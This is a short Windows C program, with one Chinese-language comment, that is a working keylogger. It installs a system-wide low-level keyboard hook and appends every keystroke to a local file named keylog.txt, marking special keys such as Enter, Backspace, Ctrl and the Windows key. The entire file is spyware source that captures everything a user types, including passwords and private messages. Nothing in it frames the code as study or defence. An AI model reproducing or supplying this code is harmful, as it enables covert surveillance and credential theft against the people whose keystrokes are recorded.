#include <windows.h>
#include <stdio.h>
HKL hkl;
LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam,
	LPARAM lParam)
{
	if (nCode < 0)
	{
		return CallNextHookEx(NULL, nCode, wParam, lParam);
	}
	if (wParam == WM_KEYDOWN)
	{
		DWORD vkCode = ((KBDLLHOOKSTRUCT*)lParam)->vkCode;
		DWORD scanCode = ((KBDLLHOOKSTRUCT*)lParam)->scanCode;
		char ch = MapVirtualKeyExA(vkCode, MAPVK_VK_TO_CHAR,
			hkl);
		FILE* fp = fopen("keylog.txt", "a");
		// 如果文件打开成功
		if (fp != NULL)
		{
			if (ch != 0)
			{
				fprintf(fp, "%c", ch);
			}
			else
			{
				switch (vkCode)
				{
				case VK_SPACE:
					fprintf(fp, " ");
					break;
				case VK_RETURN:
					fprintf(fp, "[ENTER]\n");
					break;
				case VK_BACK:
					fprintf(fp, "[BACKSPACE]");
					break;
				case VK_TAB:
					fprintf(fp, "[TAB]"); break;
				case VK_ESCAPE:
					fprintf(fp, "[ESC]");
					break;
				case VK_SHIFT:
					fprintf(fp, "[SHIFT]");
					break;
				case VK_CONTROL:
					fprintf(fp, "[CTRL]");
					break;
				case VK_MENU:
					fprintf(fp, "[ALT]");
					break;
				case VK_CAPITAL:
					fprintf(fp, "[CAPSLOCK]");
					break;
				case VK_LWIN:
				case VK_RWIN:
					fprintf(fp, "[WIN]");
					break;
				default:
					fprintf(fp, "[VK_%d]", vkCode);
					break;
				}
			}
			fclose(fp);
		}
	}
	return 0;
}
int main()
{
	hkl = GetKeyboardLayout(0);
	HHOOK hhk = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc,
		GetModuleHandle(NULL), 0);
	MSG msg;
	while (TRUE)
	{
			if (GetMessage(&msg, NULL, 0, 0) == -1)
			{
				break;
			}
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}
	UnhookWindowsHookEx(hhk);
	return 0;
}
